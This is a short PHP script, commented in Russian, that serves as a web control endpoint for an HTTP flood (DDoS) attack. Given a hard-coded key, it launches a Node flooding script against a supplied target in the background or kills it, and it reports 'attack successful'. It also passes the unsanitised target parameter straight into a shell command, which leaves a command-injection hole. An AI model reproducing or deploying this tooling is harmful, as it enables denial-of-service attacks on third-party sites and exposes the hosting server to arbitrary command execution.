<?php
if (isset($_GET['key']) && isset($_GET['target']) && isset($_GET['time']) && isset($_GET['method'])) {
    $secretKey = 'test'; // Ваш секретный ключ
    $key = $_GET['key'];
    $target = urldecode($_GET['target']); // Декодирование параметра
    $time = $_GET['time'];
    $method = $_GET['method'];

    if ($key === $secretKey) {
        if ($method === 'GET') {
            $command = "nohup node http-get.js $target $time 32 5 http.txt > /dev/null 2>&1 &";
        } elseif ($method === 'stop') {
            $command = "pkill -f $target";
        } else {
            echo "Неверный метод.";
            exit;
        }

        exec($command);
        echo "Атака успешна!";
    } else {
        echo "Неверный ключ.";
    }
} else {
    echo "Не все параметры указаны.";
}
?>